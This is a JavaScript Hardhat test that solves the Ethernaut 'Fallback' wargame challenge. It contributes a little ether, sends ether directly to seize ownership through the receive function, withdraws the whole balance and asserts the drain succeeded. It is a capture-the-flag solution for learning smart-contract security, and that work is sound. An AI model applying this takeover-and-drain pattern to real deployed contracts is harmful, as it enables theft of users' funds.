const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Fallback Exploit using EOA", function () {
  let fallbackContract,
    attacker,
    originalOwner,
    contractAddress,
    balance,
    newOwner;
  before("Setup for attack", async function () {
    [attacker] = await ethers.getSigners();
    contractAddress = "0x4c839930904B2149Dc5D28096034488e0B16c68F"; // insert contract address of ethernaut challenge
    fallbackContract = await ethers.getContractAt("Fallback", contractAddress);
  });

  it("perform exploit", async function () {
    // Attack flow
    // First we need to contribute to the fallback contract
    let txContribute = await fallbackContract.contribute({
      value: ethers.utils.parseEther(".00001"),
    });
    let contributeReceipt = await txContribute.wait();

    // Second we need to call the receive function to become the new owner

    let txreceive = await attacker.sendTransaction({
      to: contractAddress,
      value: ethers.utils.parseEther(".00001"),
    });

    let receiveReciept = await txreceive.wait();

    // call the withdrwaw function to withdraw all the eth

    newOwner = await fallbackContract.owner();

    let txWithdraw = await fallbackContract.withdraw();

    let withdrawReciept = await txWithdraw.wait();

    balance = await ethers.provider.getBalance(contractAddress);
  });

  after("confirm exploit", async function () {
    expect(newOwner).to.be.eq(attacker.address);

    expect(balance).to.be.eq("0");
  });
});
